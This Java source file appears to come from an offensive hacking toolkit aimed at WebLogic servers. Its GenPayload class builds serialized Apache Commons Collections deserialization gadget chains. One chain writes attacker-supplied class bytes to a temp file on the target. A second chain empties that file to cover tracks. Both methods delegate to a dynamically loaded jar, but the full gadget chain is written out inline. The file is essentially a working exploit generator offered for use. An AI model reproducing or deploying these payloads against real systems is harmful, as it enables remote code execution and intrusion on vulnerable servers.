package com.mtx.xiatian.hacker.weblogic;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import com.mtx.core.tools.MTXLoadJar;


public class GenPayload
{
	public static byte[] Gen(String OS, byte[] ClassByte)
	throws Exception
	
	{
		if(true)
			return (byte[])MTXLoadJar.doCallStaticMethod("GenPayload", "Gen", OS, ClassByte);
		String Path = "C:/windows/temp/1vBLBK.tmp";
		if (!OS.equals("Windows"))
		{
			Path = "/tmp/1vBLBK.tmp";
			}
		Transformer[] transforms =
		{
		new ConstantTransformer(FileOutputStream.class),
		 new InvokerTransformer("getConstructor",
                 new Class[] { Class[].class },
                 new Object[] { new Object[] { String.class ,Boolean.TYPE} }),
         new InvokerTransformer("newInstance",
                 new Class[] { Object[].class },
                 new Object[] { new Object[] { Path ,Boolean.valueOf(true)} }),
		new InvokerTransformer("write", new Class[]
		{
		byte[].class }, new Object[]
		{ ClassByte }),
		new InvokerTransformer("xxx",
		new Class[]
		{ java.lang.Class[].class },
		new Object[]
		{ new Object[]{String.class }}),
		new InvokerTransformer("ttt",
		new Class[]
		{ java.lang.Object[].class },
		new Object[]{
		new String[]{ "just for fun" }}),
		new ConstantTransformer(Integer.valueOf(1)) };
		Transformer transformerChain = new ChainedTransformer(transforms);
		Map innermap = new HashMap();
		innermap.put("value", "value");
		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
		Class cls =
		Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor ctor = cls.getDeclaredConstructor(new Class[]
		{ Class.class, Map.class });
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(new Object[]
		{ Retention.class, outmap });
		ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
		ObjectOutputStream out = new ObjectOutputStream(bo);
		out.writeObject(instance);
		out.flush();
		out.close();
		return bo.toByteArray();
		}

	
	public static byte[] DeleteFile(String OS) throws Exception
	{
		if(true)
			return (byte[])MTXLoadJar.doCallStaticMethod("GenPayload", "DeleteFile", OS);
		
		String Path = "C:/windows/temp/1vBLBK.tmp";
		if (!OS.equals("Windows"))
		
		{
			Path = "/tmp/1vBLBK.tmp";
			}
		Transformer[] transforms =
		{
		new ConstantTransformer(FileOutputStream.class),
		new InvokerTransformer("getConstructor",
		new Class[]
		{ java.lang.Class[].class }, new Object[]
		{ new Object[]
		{ String.class, Boolean.TYPE } }),
		new InvokerTransformer("newInstance",
		new Class[]
		{ java.lang.Object[].class },
		new Object[] { new Object[] {Path , Boolean.valueOf(true) } }),
		new InvokerTransformer("write", new Class[]
		{
		byte[].class }, new Object[]
		{ new byte[0] }),
		new InvokerTransformer("xxx",
		new Class[]
		{ java.lang.Class[].class },
		new Object[]
				{new Class[]
						{ String.class }}),
		new InvokerTransformer("ttt",
		new Class[]
		{ java.lang.Object[].class },
		new Object[]
				{new String[]
						{ "just for fun" }}),
		new ConstantTransformer(Integer.valueOf(1)) };
		Transformer transformerChain = new ChainedTransformer(transforms);
		Map innermap = new HashMap();
		innermap.put("value", "value");
		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
		Class cls =
		Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor ctor = cls.getDeclaredConstructor(new Class[]
		{ Class.class, Map.class });
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(new Object[]
		{ Retention.class, outmap });
		ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
		ObjectOutputStream out = new ObjectOutputStream(bo);
		out.writeObject(instance);
		out.flush();
		out.close();
		return bo.toByteArray();
		}
	
}
